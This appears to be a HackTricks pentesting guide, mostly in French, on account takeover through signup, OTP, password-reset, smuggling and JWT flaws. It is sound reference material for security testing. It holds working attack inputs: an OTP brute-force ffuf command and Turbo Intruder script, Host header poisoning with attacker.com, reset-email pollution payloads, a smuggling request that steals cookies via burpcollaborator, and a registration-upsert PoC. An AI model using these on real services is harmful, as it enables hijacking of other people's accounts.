# Inscription et vulnérabilités de prise de contrôle

{{#include ../banners/hacktricks-training.md}}

## Prise de contrôle via l'inscription

### Duplicate Registration

- Essayez de créer en utilisant un username existant
- Testez différentes variations de l'email :
- majuscules
- +1@
- ajoutez des points dans l'email
- caractères spéciaux dans le nom de l'email (%00, %09, %20)
- Insérez des caractères blancs après l'email : `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Essayez des astuces de canonicalisation d'email (dépend du service) :
- Gmail ignore les points et le subaddressing : `victim+1@gmail.com`, `v.ic.tim@gmail.com` livrent à `victim@gmail.com`
- Certains fournisseurs ne tiennent pas compte de la casse dans la partie locale
- Certains fournisseurs acceptent des confusables unicode. Essayez des homoglyphes et soft hyphen `\u00AD` dans la partie locale
- Abusez-en pour : contourner les vérifications d'unicité, obtenir des comptes/invitations workspace en double, ou bloquer les inscriptions de la victime (DoS temporaire) pendant que vous préparez une prise de contrôle

### Username Enumeration

Vérifiez si vous pouvez déterminer quand un username a déjà été enregistré dans l'application.

- Messages d'erreur différents ou codes de statut HTTP
- Différences de timing (un utilisateur existant peut déclencher une recherche vers l'IdP/DB)
- Autoremplissage du formulaire d'inscription avec les données de profil pour des emails connus
- Vérifiez les flows team/invite : saisir un email peut révéler si un compte existe

### Password Policy

Lors de la création d'un utilisateur, vérifiez la politique de mot de passe (vérifiez si vous pouvez utiliser des mots de passe faibles).  
Dans ce cas, vous pouvez essayer de bruteforce les credentials.

### SQL Injection

[**Consultez cette page** ](sql-injection/index.html#insert-statement)pour apprendre comment tenter des prises de contrôle de comptes ou extraire des informations via **SQL Injections** dans les formulaires d'enregistrement.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Une fois enregistré, essayez de changer l'email et vérifiez si ce changement est correctement validé ou s'il est possible de le modifier vers des emails arbitraires.

### More Checks

- Vérifiez si vous pouvez utiliser **disposable emails** (mailinator, yopmail, 1secmail, etc.) ou contourner la blocklist avec le subaddressing comme `victim+mailinator@gmail.com`
- **Mot de passe** **long** (>200) mène à **DoS**
- **Vérifiez les rate limits sur la création de comptes**
- Utilisez username@**burp_collab**.net et analysez le **callback**
- Si la vérification par numéro de téléphone est utilisée, vérifiez les cas limites de parsing/injection de téléphone

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Weak Email/Phone Verification (OTP/Magic Link)

Les flux d'inscription vérifient souvent la propriété via un OTP numérique ou un token magic-link. Failles typiques :

- OTP devinable ou court (4–6 chiffres) sans rate limiting efficace ni traçage IP/appareil. Essayez des tentatives parallèles et rotation des en-têtes/IP.
- Réutilisation d'OTP entre actions ou comptes, ou non lié à l'utilisateur/action spécifique (ex., même code marche pour login et signup, ou marche après changement d'email).
- Multi-value smuggling: certains backends acceptent plusieurs codes et vérifient si l'un correspond. Essayez :
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Oracle de réponse : distinguer codes incorrects vs expirés vs destinés à un autre utilisateur en se basant sur le statut/le message/la longueur du body.
- Tokens non invalidés après succès ou après changement de mot de passe/email.
- Le token de vérification n'est pas lié à l'user agent/IP permettant une complétion cross-origin depuis des pages contrôlées par l'attaquant.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Deviner en parallèle/concurremment pour contourner les verrouillages séquentiels (utiliser Turbo Intruder dans Burp) :

<details>
<summary>Extrait Turbo Intruder pour inonder les tentatives OTP à 6-chiffres</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: soumettez le même OTP valide simultanément dans deux sessions ; parfois une session devient un compte attacker vérifié tandis que le flux victim réussit aussi.
- Testez aussi le Host header poisoning sur les liens de vérification (comme le reset poisoning ci‑dessous) pour leak ou compléter la vérification sur un hôte contrôlé par l’attaquant.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Une classe puissante de problèmes survient lorsqu’un attacker effectue des actions sur l’email de la victim avant que celle‑ci ne crée son compte, puis récupère l’accès plus tard.

Techniques clés à tester (à adapter aux flux de la cible) :

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Les merges insecure peuvent laisser les deux parties connectées ou ressusciter l’accès de l’attacker
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Testez si les anciennes sessions restent valides après un reset ou l’activation de la MFA
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Le service merge sur l’email sans vérifier `email_verified` ou effectuer une vérification locale

Conseils pratiques

- Harvestez les flows et endpoints depuis les bundles web/mobile. Cherchez classic signup, SSO linking, email/phone change, et password reset endpoints.
- Créez une automation réaliste pour maintenir des sessions actives pendant que vous exercez d’autres flows.
- Pour les tests SSO, déployez un IdP OIDC de test et émettez des tokens avec des claims `email` pour l’adresse de la victim et `email_verified=false` pour vérifier si le RP fait confiance à des IdP non vérifiés.
- Après tout password reset ou email change, vérifiez que :
  - toutes les autres sessions et tokens sont invalidés,
  - les capacités de pending email/phone change sont annulées,
  - les IdPs/emails/phones précédemment liés sont re‑vérifiés.

Note : Une méthodologie étendue et des études de cas de ces techniques sont documentées par les recherches de Microsoft sur le pre‑hijacking (voir References à la fin).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et accéder à la fonctionnalité **Change password**.
2. Démarrer Burp Suite et intercepter la requête
3. Envoyer vers l'onglet repeater et modifier les paramètres : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le token de réinitialisation de mot de passe doit être généré aléatoirement et être unique à chaque fois.\
Essayez de déterminer si le token expire ou s'il est toujours le même ; dans certains cas l'algorithme de génération est faible et peut être deviné. Les variables suivantes peuvent être utilisées par l'algorithme.

- Horodatage
- UserID
- Email de l'utilisateur
- Prénom et Nom
- Date de naissance
- Cryptographie
- Chiffres seulement
- Séquence de token courte ( characters between \[A-Z,a-z,0-9])
- Réutilisation du token
- Date d'expiration du token

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Déclencher une demande de réinitialisation de mot de passe via l'API/UI pour un email spécifique, par ex : test@mail.com
2. Inspecter la réponse serveur et vérifier la présence de `resetToken`
3. Ensuite utiliser le token dans une URL comme `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. S'inscrire sur le système avec un nom d'utilisateur identique à celui de la victime, mais en insérant des espaces blancs avant et/ou après le nom d'utilisateur. ex : `"admin "`
2. Demander une réinitialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utiliser le token envoyé à votre email et réinitialiser le mot de passe de la victime.
4. Se connecter au compte de la victime avec le nouveau mot de passe.

La plateforme CTFd était vulnérable à cette attaque.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouver un XSS dans l'application ou un sous-domaine si les cookies sont scoped au domaine parent : `*.domain.com`
2. Leak le **sessions cookie** courant
3. S'authentifier en tant qu'utilisateur en utilisant le cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Utiliser **smuggler** pour détecter le type de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Concevoir une requête qui écrasera le `POST / HTTP/1.1` avec les données suivantes :\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` dans le but d'ouvrir une redirection des victimes vers burpcollab et de voler leurs cookies\
3. La requête finale pourrait ressembler à ce qui suit
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone rapporte l'exploitation de ce bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Créer un payload pour le CSRF, e.g: “HTML form with auto submit for a password change”
2. Envoyer le payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token peut être utilisé pour authentifier un utilisateur.

- Modifier le JWT avec un autre User ID / Email
- Vérifier si la signature JWT est faible


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Certains signup handlers effectuent un upsert lorsque l'email fourni existe déjà. Si l'endpoint accepte un body minimal contenant un email et un password et n'impose pas la vérification de propriété, l'envoi de l'email de la victime écrasera son password pre-auth.

- Discovery : récolter les noms d'endpoint depuis le JS bundlé (ou le trafic mobile de l'app), puis fuzz les chemins de base comme /parents/application/v4/admin/FUZZ en utilisant ffuf/dirsearch.
- Method hints : un GET renvoyant des messages comme "Only POST request is allowed." indique souvent le verbe correct et qu'un body JSON est attendu.
- Minimal body observé in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Exemple de PoC :
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impact : Full Account Takeover (ATO) sans aucun reset token, OTP ni vérification par e-mail.

## Références

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
